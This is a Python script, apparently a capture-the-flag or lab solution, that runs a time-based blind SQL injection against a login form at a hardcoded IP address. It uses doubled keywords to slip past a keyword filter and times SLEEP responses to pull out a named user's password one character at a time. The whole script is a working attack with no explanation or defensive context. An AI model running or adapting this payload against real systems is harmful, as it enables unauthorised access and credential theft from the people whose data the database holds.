import requests
import time

# Define the URL and the POST data
url = "http://140.115.59.7:12005/"
data = {
    "username": None,
    "password": "arbitrary password",
    "submit": "",
}

# Headers based on the provided HTTP request
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://140.115.59.7:12005",
    "Referer": "http://140.115.59.7:12005/"
}


# password character
lowercase_letters = list('abcdefghijklmnopqrstuvwxyz')
uppercase_letters = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
digits = list('0123456789')
special_characters = list('!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~\\')

# Combine all the characters
combined_list = (
    lowercase_letters + 
    uppercase_letters + 
    digits + 
    special_characters
)

flag = ""
count = 1
# Measure the time taken for the request
while True:
    for char in combined_list:
        # SQL injection
        data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),{count},1)='{char}'), SLEEP(1),0) -- "

        start_time = time.time()
        response = requests.post(
            url=url, 
            data=data, 
            headers=headers
        )
        end_time = time.time()

        # Calculate the duration
        duration = end_time - start_time
        print(f"char: {char} Duration: {duration.__round__(2)} seconds")
        # time.sleep(1)
        if duration > 5:
            flag = flag + char
            print(flag)
            count += 1
            break
